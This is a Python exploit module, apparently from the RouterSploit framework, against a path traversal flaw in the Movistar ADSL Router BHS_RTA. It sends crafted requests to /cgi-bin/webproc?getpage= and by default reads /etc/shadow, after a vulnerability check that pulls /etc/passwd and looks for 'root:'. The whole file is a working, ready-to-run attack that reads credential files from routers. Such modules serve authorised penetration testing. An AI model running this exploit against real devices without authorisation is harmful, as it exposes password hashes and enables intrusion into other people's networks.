from routersploit import (
    exploits,
    print_success,
    print_error,
    print_info,
    http_request,
    mute,
    validators,
)


class Exploit(exploits.Exploit):
    """
    Exploit implementation for Movistar ADSL Router BHS_RTA Path Traversal vulnerability.
    If the target is vulnerable, content of the specified file is returned.
    """
    __info__ = {
        'name': 'Movistar ADSL Router BHS_RTA Path Traversal',
        'description': 'Module exploits Movistar ADSL Router BHS_RTA Path Traversal vulnerability which allows to read any file on the system.',
        'authors': [
            'Todor Donev <todor.donev[at]gmail.com>',  # vulnerability discovery
            'Marcin Bury <marcin.bury[at]reverse-shell.com>',  # routersploit module
        ],
        'references': [
            'https://www.exploit-db.com/exploits/40734/',
        ],
        'devices': [
            'Movistar ADSL Router BHS_RTA',
        ],
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1', validators=validators.url)
    port = exploits.Option(80, 'Target Port')
    filename = exploits.Option('/etc/shadow', 'File to read')

    def run(self):
        if self.check():
            url = "{}:{}/cgi-bin/webproc?getpage={}&var:language=es_es&var:page=".format(self.target, self.port, self.filename)

            response = http_request(method="GET", url=url)
            if response is None:
                return

            if response.status_code == 200 and len(response.text):
                print_success("Success! File: %s" % self.filename)
                print_info(response.text)
            else:
                print_error("Exploit failed")
        else:
            print_error("Device seems to be not vulnerable")

    @mute
    def check(self):
        url = "{}:{}/cgi-bin/webproc?getpage=/etc/passwd&var:language=es_es&var:page=".format(self.target, self.port)

        response = http_request(method="GET", url=url)
        if response is None:
            return False  # target is not vulnerable

        if "root:" in response.text:
            return True  # target vulnerable

        return False  # target is not vulnerable
